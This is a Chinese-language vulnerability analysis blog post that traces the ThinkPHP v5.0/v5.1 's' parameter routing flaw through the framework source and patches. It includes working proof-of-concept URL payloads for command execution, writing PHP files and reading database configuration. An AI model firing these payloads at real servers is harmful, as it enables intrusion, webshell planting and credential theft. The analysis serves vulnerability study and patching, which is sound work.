---
title: thinkphp v5.x App.php s参数RCE
tags: 
  - cms
categories: codereview
date: 2019-02-05 16:02:06
---

## 概述

放假了，对thinkphp的几个RCE做一下分析，记录一下XD
<!-- more -->

## thinkphp v5.0.x

#### 漏洞相关信息

漏洞版本：<= 5.0.22
补丁：[版本更新 · top-think/framework@4cbc0b5 · GitHub](https://github.com/top-think/framework/commit/4cbc0b5e93314446243ebc7d5f005f9c32864737)
问题点：library/think/App.php

#### 漏洞分析

##### 关于thinkphp的url解析方式
THINKPHP支持使用PATHINFO的方式来访问具体的模块、类、方法，如`index.php/module/controller/action`
对于不支持PATHINFO的服务器，THINKPHP提供了兼容模式`?s=/module/controller/action`的方式来访问
而这次的漏洞成因就是在于兼容模式处理时存在的问题。
首先看 `thinkphp/library/think/Request.php`的`pathinfo`函数

```php
public function pathinfo()
{
    if (is_null($this->pathinfo)) {
        if (isset($_GET[Config::get('var_pathinfo')])) {
            // 判断URL里面是否有兼容模式参数
            $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];
            unset($_GET[Config::get('var_pathinfo')]);
        } elseif (IS_CLI) {
            // CLI模式下 index.php module/controller/action/params/...
            $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
        }

        // 分析PATHINFO信息
        ...
        $this->pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/');
    }
    return $this->pathinfo;
}
```
当GET请求中带有s参数(config中默认var_pathinfo为s)，将pathinfo设置为s的参数值
有了pathinfo值，我们再找到具体的解析url的函数，`thinkphp/library/think/Route.php`的`parseUrl`函数
```php
public static function parseUrl($url, $depr = '/', $autoSearch = false)
{
    if (isset(self::$bind['module'])) {
        $bind = str_replace('/', $depr, self::$bind['module']);
        // 如果有模块/控制器绑定
        $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
    }
    $url              = str_replace($depr, '|', $url);
    list($path, $var) = self::parseUrlPath($url);
    $route            = [null, null, null];
    // ...
}
```
其中parseUrl函数的`$url`为上面拿到的pathinfo，`$depr`为默认的分割符
首先对`$url`替换分割符为`|`，再输入到`parseUrlPath`函数(根据`/`分割)，该函数对pathinfo进行分割，产生`module`、`controller`、`action`
那么现在来看rce的Poc`?s=/index/\think\app/invokefunction`=>`[module:index,controller:\think\app,action:invokefunction]`
其中controller=>\think\app，是php命名空间的表示方式，\think\app实际调用library/think/App.php，后面的action实际调用的App.php中的invokefunction函数

##### 漏洞成因点

上面分析了thinkphp的兼容模式是如何处理s参数的，并且处理存在一个问题就是可以伪造controller，导致实际调用为其他的类和函数
看一下拿到module、controller、action后系统的处理
thinkphp/library/think/App.php 的 module函数
```php
public static function module($result, $config, $convert = null)
{
    if (is_string($result)) {
        $result = explode('/', $result);
    }

    $request = Request::instance();

    ...

    // 设置默认过滤机制
    $request->filter($config['default_filter']);

    ...

    try {
        $instance = Loader::controller(// 实例化controller类
            $controller,
            $config['url_controller_layer'],
            $config['controller_suffix'],
            $config['empty_controller']
        );
    } catch (ClassNotFoundException $e) {
        throw new HttpException(404, 'controller not exists:' . $e->getClass());
    }

    // 获取当前操作名
    $action = $actionName . $config['action_suffix'];

    $vars = [];
    if (is_callable([$instance, $action])) {
        // 执行操作方法
        $call = [$instance, $action];
        // 严格获取当前操作方法名
        $reflect    = new \ReflectionMethod($instance, $action);
        $methodName = $reflect->getName();
        $suffix     = $config['action_suffix'];
        $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
        $request->action($actionName);

    } elseif (is_callable([$instance, '_empty'])) {
        // 空操作
        $call = [$instance, '_empty'];
        $vars = [$actionName];
    } else {
        // 操作不存在
        throw new HttpException(404, 'method not exists:' . get_class($instance) . '->' . $action . '()');
    }

    Hook::listen('action_begin', $call);

    return self::invokeMethod($call, $vars);// 调用函数
}
```
拿到实例化后的对象和方法，动态调用`invokeMethod`
```php
public static function invokeMethod($method, $vars = [])
{
    if (is_array($method)) {
        $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
        $reflect = new \ReflectionMethod($class, $method[1]);
    } else {
        // 静态方法
        $reflect = new \ReflectionMethod($method);
    }

    $args = self::bindParams($reflect, $vars);// 获取参数内容 这里获取到参数用做method的参数输入

    self::$debug && Log::record('[ RUN ] ' . $reflect->class . '->' . $reflect->name . '[ ' . $reflect->getFileName() . ' ]', 'info');

    return $reflect->invokeArgs(isset($class) ? $class : null, $args);
}
```
这里使用bindParams函数从get或post中获取到对应的内容，需要注意的是，做参数嵌入时，需要以函数的参数名为键
如invokeFunction的参数为`$function`、`$vars`，那么在参数中就需要以`function=xxx&vars[0]=xxx&vars[1]=xxx`
即poc的后半部分`function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-l`
所以调用链现在变成了
  1. 动态调用\think\app invokeFunction函数
  2. 提供function=call_user_func_array作为invokeFunction动态调用的参数，所以下一步调用call_user_func_array函数
  3. call_user_func_array的参数为system函数，system函数的参数为ls -l，所以这里用了2维数组


![93754c5f.png](/attachments/93754c5f.png)
所以我们可以发散一下思维，我们其实不单单可以调用\think\app这个类，如果其他的类可以任意调用其他函数，或者是调用命令执行函数，同样具有危害性
如任意命令执行
`?s=/index/think\view\driver\php/display&content=<?php%20phpinfo();`
任意文件写入，生成在index.php同一级目录
`?s=index/\think\template\driver\file/write&cacheFile=test.php&content=<?php%20phpinfo();`
获取配置信息
`?s=index/\think\config/get&name=database.username`

## thinkphp v5.1.x

#### 版本信息
版本：<= v5.1.30
补丁信息：[修正控制器调用 · top-think/framework@802f284 · GitHub](https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815)
漏洞点：thinkphp/library/think/route/dispatch/Module.php

#### 漏洞分析
原理同v5.0.x版本类似，也是由于s参数带入的路径解析存在安全问题导致的任意代码执行
先看App::run()
```php
public function run()
{
    try {
        // 初始化应用
        $this->initialize();

        ...

        $dispatch = $this->dispatch;

        if (empty($dispatch)) {
            // 路由检测
            $dispatch = $this->routeCheck()->init();// 处理module、controller、action
        }

        // 记录当前调度信息
        $this->request->dispatch($dispatch);

        ...

    } catch (HttpResponseException $exception) {
        $dispatch = null;
        $data     = $exception->getResponse();
    }

    $this->middleware->add(function (Request $request, $next) use ($dispatch, $data) {
        return is_null($data) ? $dispatch->run() : $data;
    });

    $response = $this->middleware->dispatch($this->request);// 动态调用controller、action

    ...

    return $response;
}
```
App::run()函数体现了程序的一个主要流程，从路径的解析到动态解析执行相应的控制器及方法
先来看看第13行，获取相应的路径信息
thinkphp/library/think/App.php routeCheck()函数
```php
public function routeCheck()
{
    // 检测路由缓存
    ...

    // 获取应用调度信息
    $path = $this->request->path();
    // 从Request.php path提取urlpath 具体从pathinfo()，优先获取$_GET[$this->config['var_pathinfo']]
    // var_pathinfo 默认为s

    // 是否强制路由模式
    $must = !is_null($this->routeMust) ? $this->routeMust : $this->route->config('url_route_must');

    // 路由检测 返回一个Dispatch对象
    $dispatch = $this->route->check($path, $must);//返回UrlDispatch类实例，从dispatch类处继承

    ...

    return $dispatch;
}
```
第7行从s参数中获取路由路径(s为var_pathinfo的默认值)，在调用routeCheck函数后返回一个UrlDispatch，之后调用了Url类的init函数
thinkphp/library/think/route/dispatch/Url.php init
```php
public function init()
{
    // 解析默认的URL规则
    $result = $this->parseUrl($this->dispatch);
    // parseUrl函数处理参数值(以/分割，传入|也行会被替换成/，最终由/来分割)，返回[module,controller,action]

    return (new Module($this->request, $this->rule, $result))->init();
}
```
返回Module对象，继承自Dispatch对象，并且调用了init函数，将解析后的路由填充到dispatch，供后面App::run()函数动态调用dispatch的run函数，v5.1版本的调用链复杂了一点，但是其实内容同v5.0版本类似
Dispatch::run()函数调用了Module::exec()函数
thinkphp/library/think/route/dispatch/Module.php exec()
```php
public function exec()
{
    // 监听module_init
    $this->app['hook']->listen('module_init');

    try {
        // 实例化控制器
        $instance = $this->app->controller($this->controller,
            $this->rule->getConfig('url_controller_layer'),
            $this->rule->getConfig('controller_suffix'),
            $this->rule->getConfig('empty_controller'));

        if ($instance instanceof Controller) {
            $instance->registerMiddleware();
        }
    } catch (ClassNotFoundException $e) {
        throw new HttpException(404, 'controller not exists:' . $e->getClass());
    }
    // 闭包调用
    $this->app['middleware']->controller(function (Request $request, $next) use ($instance) {
        // 获取当前操作名
        $action = $this->actionName . $this->rule->getConfig('action_suffix');

        if (is_callable([$instance, $action])) {
            // 执行操作方法
            $call = [$instance, $action];

            // 严格获取当前操作方法名
            $reflect    = new ReflectionMethod($instance, $action);
            $methodName = $reflect->getName();
            $suffix     = $this->rule->getConfig('action_suffix');
            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
            $this->request->setAction($actionName);

            // 自动获取请求变量
            $vars = $this->rule->getConfig('url_param_type')
            ? $this->request->route()
            : $this->request->param();
            $vars = array_merge($vars, $this->param);
        } elseif (is_callable([$instance, '_empty'])) {
            // 空操作
            $call    = [$instance, '_empty'];
            $vars    = [$this->actionName];
            $reflect = new ReflectionMethod($instance, '_empty');
        } else {
            // 操作不存在
            throw new HttpException(404, 'method not exists:' . get_class($instance) . '->' . $action . '()');
        }

        $this->app['hook']->listen('action_begin', $call);

        $data = $this->app->invokeReflectMethod($instance, $reflect, $vars);

        return $this->autoResponse($data);
    });

    return $this->app['middleware']->dispatch($this->request, 'controller');
}
```
简单描述exec函数，实例化controller，用于后面20行到55行的闭包函数，这个必报函数主要完成了调用controller的action，并获取输入的参数值，最后由invokeReflectMethod完成主要的调用。
最终的调用函数为Request::filterValue函数
```php
private function filterValue(&$value, $key, $filters)
{
    $default = array_pop($filters);

    foreach ($filters as $filter) {
        if (is_callable($filter)) {
            // 调用函数或者方法过滤
            $value = call_user_func($filter, $value);//调用函数
        } elseif (is_scalar($value)) {
            if (false !== strpos($filter, '/')) {
                // 正则过滤
                if (!preg_match($filter, $value)) {
                    // 匹配不成功返回默认值
                    $value = $default;
                    break;
                }
            } elseif (!empty($filter)) {
                // filter函数不存在时, 则使用filter_var进行过滤
                // filter为非整形值时, 调用filter_id取得过滤id
                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                if (false === $value) {
                    $value = $default;
                    break;
                }
            }
        }
    }

    return $value;
}
```
到这里其实思路很明显，利用/分割出能利用的controller，并输入相应的参数值，接下来就是找可利用的函数。
v5.0版本中poc都能用

如任意命令执行
`?s=/index/think\view\driver\php/display&content=<?php%20phpinfo();`
任意文件写入，生成在index.php同一级目录
`?s=index/\think\template\driver\file/write&cacheFile=test.php&content=<?php%20phpinfo();`
获取配置信息
`?s=index/\think\config/get&name=database.username`
除此之外，还可以使用\think\request/input（v5.0版本不能用是因为think\request的构造函数为protected，不允许动态调用）
如任意代码执行
`?s=index/\think\request/input&data[]=123&filter=phpinfo`
invokeFunction核心ReflectionFunction
`?s=index/\think\container/invokeFunction&function=call_user_func&vars[0]=phpinfo&vars[1]=1`
`?s=index/\think\container/invokeFunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
因为think\app继承自think\container，所以改成think\app也行
其中call_user_func填充参数时，以数组形式，第一个为函数名，第二个为函数参数
call_user_func_array填充参数时，以数组形式，第一个为函数名，第二个为函数参数（也为数组形式）
这里v5.1只能用php7，如v5.0还可以使用assert来执行函数

## 总结
这次出的这个漏洞危害很大，整个调用过程也非常漂亮，值得一步一步调试。
其中收获大致就是了解了thinkphp v5版本路由调用的流程，v5.1版本的闭包函数构造的方式给框架带来了不一样的感受，不得不给thinkphp一个赞
